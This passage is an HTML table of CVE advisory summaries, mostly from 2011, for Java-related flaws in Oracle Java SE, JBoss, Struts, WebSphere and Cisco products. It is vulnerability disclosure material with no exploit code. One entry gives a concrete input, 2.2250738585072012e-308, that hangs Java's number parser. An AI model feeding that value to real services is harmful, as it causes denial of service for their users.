		<td valign="top">Unspecified vulnerability in the Java Runtime Environment component in Oracle Java SE JDK and JRE 7, 6 Update 27 and earlier, and JRockit R28.1.4 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to 2D.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-3550">CVE-2011-3550</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment component in Oracle Java SE JDK and JRE 7, 6 Update 27 and earlier allows remote untrusted Java Web Start applications and untrusted Java applets to affect confidentiality, integrity, and availability, related to AWT.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-3549">CVE-2011-3549</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment component in Oracle Java SE JDK and JRE 6 Update 27 and earlier, 5.0 Update 31 and earlier, and 1.4.2_33 and earlier allows remote untrusted Java Web Start applications and untrusted Java applets to affect confidentiality, integrity, and availability via unknown vectors related to Swing.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-3548">CVE-2011-3548</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment component in Oracle Java SE JDK and JRE 7, 6 Update 27 and earlier, 5.0 Update 31 and earlier, and 1.4.2_33 and earlier allows remote untrusted Java Web Start applications and untrusted Java applets to affect confidentiality, integrity, and availability, related to AWT.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-3547">CVE-2011-3547</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment component in Oracle Java SE JDK and JRE 7, 6 Update 27 and earlier, 5.0 Update 31 and earlier, and 1.4.2_33 and earlier allows remote untrusted Java Web Start applications and untrusted Java applets to affect confidentiality via unknown vectors related to Networking.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-3546">CVE-2011-3546</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment component in Oracle Java SE JDK and JRE 7, 6 Update 27 and earlier, and JavaFX 2.0 allows remote untrusted Java Web Start applications and untrusted Java applets to affect confidentiality and integrity via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-3545">CVE-2011-3545</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment component in Oracle Java SE JDK and JRE 6 Update 27 and earlier, 5.0 Update 31 and earlier, and 1.4.2_33 and earlier, and JRockit R28.1.4 and earlier, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Sound.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-3544">CVE-2011-3544</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment component in Oracle Java SE JDK and JRE 7 and 6 Update 27 and earlier allows remote untrusted Java Web Start applications and untrusted Java applets to affect confidentiality, integrity, and availability via unknown vectors related to Scripting.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-3521">CVE-2011-3521</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment component in Oracle Java SE JDK and JRE, 7, 6 Update 27 and earlier, and 5.0 Update 31 and earlier allows remote untrusted Java Web Start applications and untrusted Java applets to affect confidentiality, integrity, and availability via unknown vectors related to Deserialization.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-3516">CVE-2011-3516</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment component in Oracle Java SE JDK and JRE 6 Update 27 and earlier, when running on Windows, allows remote untrusted Java Web Start applications and untrusted Java applets to affect confidentiality, integrity, and availability via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-3389">CVE-2011-3389</a></td>
		<td valign="top">The SSL protocol, as used in certain configurations in Microsoft Windows and Microsoft Internet Explorer, Mozilla Firefox, Google Chrome, Opera, and other products, encrypts data by using CBC mode with chained initialization vectors, which allows man-in-the-middle attackers to obtain plaintext HTTP headers via a blockwise chosen-boundary attack (BCBA) on an HTTPS session, in conjunction with JavaScript code that uses (1) the HTML5 WebSocket API, (2) the Java URLConnection API, or (3) the Silverlight WebClient API, aka a "BEAST" attack.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-3387">CVE-2011-3387</a></td>
		<td valign="top">The class file parser in IBM Java 1.4.2 SR13 FP9 allows remote authenticated users to cause a denial of service (memory consumption or an infinite loop) via a crafted attribute length field in a class file, related to validation of a length field at the wrong time, a different vulnerability than CVE-2011-0311.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-3376">CVE-2011-3376</a></td>
		<td valign="top">org/apache/catalina/core/DefaultInstanceManager.java in Apache Tomcat 7.x before 7.0.22 does not properly restrict ContainerServlets in the Manager application, which allows local users to gain privileges by using an untrusted web application to access the Manager application's functionality.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-3138">CVE-2011-3138</a></td>
		<td valign="top">The LTPA STS module support implementation in IBM Tivoli Federated Identity Manager (TFIM) 6.2.0 before 6.2.0.9 and Tivoli Federated Identity Manager Business Gateway (TFIMBG) 6.2.0 before 6.2.0.9 relies on a static instance of a Java Development Kit (JDK) class, which might allow attackers to bypass LTPA token signature verification by leveraging lack of thread safety.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-2927">CVE-2011-2927</a></td>
		<td valign="top">Multiple cross-site scripting (XSS) vulnerabilities in Spacewalk 1.6, as used in Red Hat Network (RHN) Satellite, allow remote attackers to inject arbitrary web script or HTML via vectors related to Search forms.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-2908">CVE-2011-2908</a></td>
		<td valign="top">Cross-site request forgery (CSRF) vulnerability in the JMX Console (jmx-console) in JBoss Enterprise Portal Platform before 5.2.2, BRMS Platform 5.3.0 before roll up patch1, and SOA Platform 5.3.0 allows remote authenticated users to hijack the authentication of arbitrary users for requests that perform operations on MBeans and possibly execute arbitrary code via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-2730">CVE-2011-2730</a></td>
		<td valign="top">VMware SpringSource Spring Framework before 2.5.6.SEC03, 2.5.7.SR023, and 3.x before 3.0.6, when a container supports Expression Language (EL), evaluates EL expressions in tags twice, which allows remote attackers to obtain sensitive information via a (1) name attribute in a (a) spring:hasBindErrors tag; (2) path attribute in a (b) spring:bind or (c) spring:nestedpath tag; (3) arguments, (4) code, (5) text, (6) var, (7) scope, or (8) message attribute in a (d) spring:message or (e) spring:theme tag; or (9) var, (10) scope, or (11) value attribute in a (f) spring:transform tag, aka "Expression Language Injection."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-2640">CVE-2011-2640</a></td>
		<td valign="top">Opera before 11.10 allows remote attackers to cause a denial of service (application crash) via an HTML document that has an empty parameter value for an embedded Java applet.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-2514">CVE-2011-2514</a></td>
		<td valign="top">The Java Network Launching Protocol (JNLP) implementation in IcedTea6 1.9.x before 1.9.9 and before 1.8.9, and IcedTea-Web 1.1.x before 1.1.1 and before 1.0.4, allows remote attackers to trick victims into granting access to local files by modifying the content of the Java Web Start Security Warning dialog box to represent a different filename than the file for which access will be granted.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-2513">CVE-2011-2513</a></td>
		<td valign="top">The Java Network Launching Protocol (JNLP) implementation in IcedTea6 1.9.x before 1.9.9 and before 1.8.9, and IcedTea-Web 1.1.x before 1.1.1 and before 1.0.4, allows remote attackers to obtain the username and full path of the home and cache directories by accessing properties of the ClassLoader.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-2196">CVE-2011-2196</a></td>
		<td valign="top">jboss-seam.jar in the JBoss Seam 2 framework 2.2.x and earlier, as distributed in Red Hat JBoss Enterprise SOA Platform 4.3.0.CP05 and 5.1.0; JBoss Enterprise Application Platform (aka JBoss EAP or JBEAP) 4.3.0, 4.3.0.CP09, and 5.1.1; and JBoss Enterprise Web Platform 5.1.1, does not properly restrict use of Expression Language (EL) statements in FacesMessages during page exception handling, which allows remote attackers to execute arbitrary Java code via a crafted URL to an application. NOTE: this vulnerability exists because of an incomplete fix for CVE-2011-1484.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-2088">CVE-2011-2088</a></td>
		<td valign="top">XWork 2.2.1 in Apache Struts 2.2.1, and OpenSymphony XWork in OpenSymphony WebWork, allows remote attackers to obtain potentially sensitive information about internal Java class paths via vectors involving an s:submit element and a nonexistent method, a different vulnerability than CVE-2011-1772.3.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-2087">CVE-2011-2087</a></td>
		<td valign="top">Multiple cross-site scripting (XSS) vulnerabilities in component handlers in the javatemplates (aka Java Templates) plugin in Apache Struts 2.x before 2.2.3 allow remote attackers to inject arbitrary web script or HTML via an arbitrary parameter value to a .action URI, related to improper handling of value attributes in (1) FileHandler.java, (2) HiddenHandler.java, (3) PasswordHandler.java, (4) RadioHandler.java, (5) ResetHandler.java, (6) SelectHandler.java, (7) SubmitHandler.java, and (8) TextFieldHandler.java.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-2040">CVE-2011-2040</a></td>
		<td valign="top">The helper application in Cisco AnyConnect Secure Mobility Client (formerly AnyConnect VPN Client) before 2.5.3041, and 3.0.x before 3.0.629, on Linux and Mac OS X downloads a client executable file (vpndownloader.exe) without verifying its authenticity, which allows remote attackers to execute arbitrary code via the url property to a Java applet, aka Bug ID CSCsy05934.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-1969">CVE-2011-1969</a></td>
		<td valign="top">Microsoft Forefront Unified Access Gateway (UAG) 2010 Gold, Update 1, Update 2, and SP1 provides the MicrosoftClient.jar file containing a signed Java applet, which allows remote attackers to execute arbitrary code on client machines via unspecified vectors, aka "Poisoned Cup of Code Execution Vulnerability."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-1827">CVE-2011-1827</a></td>
		<td valign="top">Multiple unspecified vulnerabilities in Check Point SSL Network Extender (SNX), SecureWorkSpace, and Endpoint Security On-Demand, as distributed by SecurePlatform, IPSO6, Connectra, and VSX, allow remote attackers to execute arbitrary code via vectors involving a (1) ActiveX control or (2) Java applet.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-1484">CVE-2011-1484</a></td>
		<td valign="top">jboss-seam.jar in the JBoss Seam 2 framework 2.2.x and earlier, as distributed in Red Hat JBoss Enterprise SOA Platform 4.3.0.CP04 and 5.1.0 and JBoss Enterprise Application Platform (aka JBoss EAP or JBEAP) 4.3.0.CP09 and 5.1.0, does not properly restrict use of Expression Language (EL) statements in FacesMessages during page exception handling, which allows remote attackers to execute arbitrary Java code via a crafted URL to an application.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-1377">CVE-2011-1377</a></td>
		<td valign="top">The Web Services Security component in the Web Services Feature Pack before 6.1.0.41 for IBM WebSphere Application Server (WAS) 6.1 does not properly handle the enabling of WS-Security for a JAX-WS application, which has unspecified impact and attack vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-1368">CVE-2011-1368</a></td>
		<td valign="top">The JavaServer Faces (JSF) application functionality in IBM WebSphere Application Server 8.x before 8.0.0.1 does not properly handle requests, which allows remote attackers to read unspecified files via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-1322">CVE-2011-1322</a></td>
		<td valign="top">The SOAP with Attachments API for Java (SAAJ) implementation in the Web Services component in IBM WebSphere Application Server (WAS) 6.1.0.x before 6.1.0.37 and 7.x before 7.0.0.15 allows remote attackers to cause a denial of service (memory consumption) via encrypted SOAP messages.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-1319">CVE-2011-1319</a></td>
		<td valign="top">The Security component in IBM WebSphere Application Server (WAS) 6.1.0.x before 6.1.0.35 and 7.x before 7.0.0.15 allows remote authenticated users to cause a denial of service (memory consumption) by using a Lightweight Third-Party Authentication (LTPA) token for authentication.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-0921">CVE-2011-0921</a></td>
		<td valign="top">crs.exe in the Cell Manager Service in the client in HP Data Protector does not properly validate credentials associated with the hostname, domain, and username, which allows remote attackers to execute arbitrary code by sending unspecified data over TCP, related to the webreporting client, the applet domain, and the java username.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-0902">CVE-2011-0902</a></td>
		<td valign="top">Multiple untrusted search path vulnerabilities in the Java Service in Sun Microsystems SunScreen Firewall on SunOS 5.9 allow local users to execute arbitrary code via a modified (1) PATH or (2) LD_LIBRARY_PATH environment variable.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-0873">CVE-2011-0873</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 6 Update 25 and earlier, and 5.0 Update 29 and earlier, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to 2D.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-0872">CVE-2011-0872</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 6 Update 25 and earlier allows remote attackers to affect availability via unknown vectors related to NIO.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-0871">CVE-2011-0871</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 6 Update 25 and earlier, 5.0 Update 29 and earlier, and 1.4.2_31 and earlier allows remote untrusted Java Web Start applications and untrusted Java applets to affect confidentiality, integrity, and availability via unknown vectors related to Swing.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-0869">CVE-2011-0869</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 6 Update 26 and earlier allows remote untrusted Java Web Start applications and untrusted Java applets to affect confidentiality via unknown vectors related to SAAJ.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-0868">CVE-2011-0868</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 6 Update 25 and earlier allows remote attackers to affect confidentiality via unknown vectors related to 2D.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-0867">CVE-2011-0867</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 6 Update 25 and earlier, 5.0 Update 29 and earlier, and 1.4.2_31 and earlier allows remote untrusted Java Web Start applications and untrusted Java applets to affect confidentiality via unknown vectors related to Networking.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-0866">CVE-2011-0866</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 6 Update 25 and earlier, 5.0 Update 29 and earlier, and 1.4.2_31 and earlier, when running on Windows, allows remote untrusted Java Web Start applications and untrusted Java applets to affect confidentiality, integrity, and availability via unknown vectors related to Java Runtime Environment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-0865">CVE-2011-0865</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 6 Update 25 and earlier, 5.0 Update 29 and earlier, and 1.4.2_31 and earlier allows remote untrusted Java Web Start applications and untrusted Java applets to affect integrity via unknown vectors related to Deserialization.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-0864">CVE-2011-0864</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 6 Update 25 and earlier, 5.0 Update 29 and earlier, and 1.4.2_31 and earlier allows remote untrusted Java Web Start applications and untrusted Java applets to affect confidentiality, integrity, and availability via unknown vectors related to HotSpot.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-0863">CVE-2011-0863</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 6 Update 25 and earlier allows remote untrusted Java Web Start applications and untrusted Java applets to affect confidentiality, integrity, and availability via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-0862">CVE-2011-0862</a></td>
		<td valign="top">Multiple unspecified vulnerabilities in the Java Runtime Environment (JRE) component in Oracle Java SE 6 Update 25 and earlier, 5.0 Update 29 and earlier, and 1.4.2_31 and earlier allow remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to 2D.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-0849">CVE-2011-0849</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java Dynamic Management Kit 5.1 allows remote attackers to affect integrity, related to HTML Adaptor.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-0847">CVE-2011-0847</a></td>
		<td valign="top">Unspecified vulnerability in the OpenSSO Enterprise and Sun Java System Access Manager components in Oracle Sun Products Suite 7.1 and 8.0 allows remote authenticated users to affect confidentiality via unknown vectors related to Authentication.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-0846">CVE-2011-0846</a></td>
		<td valign="top">Unspecified vulnerability in the Oracle Sun Java System Access Manager Policy Agent 2.2 allows remote attackers to affect availability via unknown vectors related to Web Proxy Agent.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-0844">CVE-2011-0844</a></td>
		<td valign="top">Unspecified vulnerability in the OpenSSO Enterprise and Sun Java System Access Manager components in Oracle Sun Products Suite 7.1 and 8.0 allows remote attackers to affect integrity via unknown vectors related to Authentication.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-0817">CVE-2011-0817</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 6 Update 25 and earlier, when running on Windows, allows remote untrusted Java Web Start applications and untrusted Java applets to affect confidentiality, integrity, and availability via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-0815">CVE-2011-0815</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 6 Update 25 and earlier, 5.0 Update 29 and earlier, and 1.4.2_31 and earlier allows remote untrusted Java Web Start applications and untrusted Java applets to affect confidentiality, integrity, and availability via unknown vectors related to AWT.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-0814">CVE-2011-0814</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 6 Update 25 and earlier, 5.0 Update 29 and earlier, and 1.4.2_31 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Sound, a different vulnerability than CVE-2011-0802.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-0807">CVE-2011-0807</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Sun GlassFish Enterprise Server 2.1, 2.1.1, and 3.0.1, and Sun Java System Application Server 9.1, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Administration.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-0802">CVE-2011-0802</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 6 Update 25 and earlier, 5.0 Update 29 and earlier, and 1.4.2_31 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Sound, a different vulnerability than CVE-2011-0814.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-0788">CVE-2011-0788</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 6 Update 25 and earlier, when running on Windows, allows remote untrusted Java Web Start applications and untrusted Java applets to affect confidentiality, integrity, and availability via unknown vectors related to Deployment, a different vulnerability than CVE-2011-0786.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-0786">CVE-2011-0786</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 6 Update 25 and earlier, when running on Windows, allows remote untrusted Java Web Start applications and untrusted Java applets to affect confidentiality, integrity, and availability via unknown vectors related to Deployment, a different vulnerability than CVE-2011-0788.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-0410">CVE-2011-0410</a></td>
		<td valign="top">CollabNet ScrumWorks Basic 1.8.4 uses cleartext credentials for network communication and the internal database, which makes it easier for context-dependent attackers to obtain sensitive information by (1) sniffing the network for transmissions of Java objects or (2) reading the database.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-0388">CVE-2011-0388</a></td>
		<td valign="top">Cisco TelePresence Recording Server devices with software 1.6.x and Cisco TelePresence Multipoint Switch (CTMS) devices with software 1.0.x, 1.1.x, 1.5.x, and 1.6.x do not properly restrict remote access to the Java servlet RMI interface, which allows remote attackers to cause a denial of service (memory consumption and web outage) via multiple crafted requests, aka Bug IDs CSCtg35830 and CSCtg35825.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-0384">CVE-2011-0384</a></td>
		<td valign="top">The Java Servlet framework on Cisco TelePresence Multipoint Switch (CTMS) devices with software 1.0.x, 1.1.x, 1.5.x, and 1.6.x does not require administrative authentication for unspecified actions, which allows remote attackers to execute arbitrary code via a crafted request, aka Bug ID CSCtf01253.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-0383">CVE-2011-0383</a></td>
		<td valign="top">The Java Servlet framework on Cisco TelePresence Recording Server devices with software 1.6.x before 1.6.2 and Cisco TelePresence Multipoint Switch (CTMS) devices with software 1.0.x, 1.1.x, 1.5.x, and 1.6.x does not require administrative authentication for unspecified actions, which allows remote attackers to execute arbitrary code via a crafted request, aka Bug IDs CSCtf42005 and CSCtf42008.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-0381">CVE-2011-0381</a></td>
		<td valign="top">Cisco TelePresence Manager 1.2.x through 1.6.x allows remote attackers to perform unspecified actions and consequently execute arbitrary code via a crafted request to the Java RMI interface, related to a "command injection vulnerability," aka Bug ID CSCtf97085.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-0311">CVE-2011-0311</a></td>
		<td valign="top">The class file parser in IBM Java before 1.4.2 SR13 FP9, as used in IBM Runtimes for Java Technology 5.0.0 before SR13 and 6.0.0 before SR10, allows remote authenticated users to cause a denial of service (JVM segmentation fault, and possibly memory consumption or an infinite loop) via a crafted attribute length field in a class file, which triggers a buffer over-read.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-0276">CVE-2011-0276</a></td>
		<td valign="top">HP OpenView Performance Insight Server 5.2, 5.3, 5.31, 5.4, and 5.41 contains a "hidden account" in the com.trinagy.security.XMLUserManager Java class, which allows remote attackers to execute arbitrary code via the doPost method in the com.trinagy.servlet.HelpManagerServlet class.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-0219">CVE-2011-0219</a></td>
		<td valign="top">Apple Safari before 5.0.6 allows remote attackers to bypass the Same Origin Policy, and modify the rendering of text from arbitrary web sites, via a Java applet that loads fonts.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-0076">CVE-2011-0076</a></td>
		<td valign="top">Unspecified vulnerability in the Java Embedding Plugin (JEP) in Mozilla Firefox before 3.5.19 and 3.6.x before 3.6.17, and SeaMonkey before 2.0.14, on Mac OS X allows remote attackers to bypass intended access restrictions via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-0067">CVE-2011-0067</a></td>
		<td valign="top">Mozilla Firefox before 3.5.19 and 3.6.x before 3.6.17, and SeaMonkey before 2.0.14, does not properly implement autocompletion for forms, which allows remote attackers to read form history entries via a Java applet that spoofs interaction with the autocomplete controls.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-5326">CVE-2010-5326</a></td>
		<td valign="top">The Invoker Servlet on SAP NetWeaver Application Server Java platforms, possibly before 7.3, does not require authentication, which allows remote attackers to execute arbitrary code via an HTTP or HTTPS request, as exploited in the wild in 2013 through 2016, aka a "Detour" attack.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-5207">CVE-2010-5207</a></td>
		<td valign="top">Multiple untrusted search path vulnerabilities in CelFrame Office 2008 Standard Edition allow local users to gain privileges via a Trojan horse (1) java_msci.dll or (2) msci_java.dll file in the current working directory, as demonstrated by a directory that contains a .doc, .xls, or .odg file.  NOTE: some of these details are obtained from third party information.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-5205">CVE-2010-5205</a></td>
		<td valign="top">Multiple untrusted search path vulnerabilities in e-press ONE Office Author allow local users to gain privileges via a Trojan horse (1) java_msci.dll or (2) msci_java.dll file in the current working directory, as demonstrated by a directory that contains a .psw file. NOTE: some of these details are obtained from third party information.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-5192">CVE-2010-5192</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in the Java Management Console in Blue Coat ProxySG before SGOS 4.3.4.1, 5.x before SGOS 5.4.5.1, 5.5 before SGOS 5.5.4.1, and 6.x before SGOS 6.1.1.1 allows remote attackers to inject arbitrary web script or HTML via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-4548">CVE-2010-4548</a></td>
		<td valign="top">IBM Lotus Notes Traveler before 8.5.1.2 allows remote authenticated users to cause a denial of service (daemon crash) by accepting a meeting invitation with an iNotes client and then accepting this meeting invitation with an iPhone client.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-4476">CVE-2010-4476</a></td>
		<td valign="top">The Double.parseDouble method in Java Runtime Environment (JRE) in Oracle Java SE and Java for Business 6 Update 23 and earlier, 5.0 Update 27 and earlier, and 1.4.2_29 and earlier, as used in OpenJDK, Apache, JBossweb, and other products, allows remote attackers to cause a denial of service via a crafted string that triggers an infinite loop of estimations during conversion to a double-precision binary floating-point number, as demonstrated using 2.2250738585072012e-308.

</td>
	</tr>
	<tr>
